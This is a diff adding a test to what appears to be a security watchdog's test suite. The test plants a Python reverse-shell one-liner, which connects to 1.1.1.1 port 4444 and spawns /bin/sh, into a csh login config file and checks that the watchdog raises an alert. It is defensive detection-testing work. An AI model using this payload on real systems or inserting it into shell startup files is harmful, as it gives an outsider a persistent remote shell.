@@ -266,3 +266,18 @@ seed_benign() {
     FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
     cap | grep -q 'user-distinctive-attacker'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on csh-config surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the csh per-
+    # login source surface (T1546.004 — csh.login + csh.cshrc +
+    # csh.logout sourced into every csh/tcsh interactive login).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# csh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${CSHRC}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
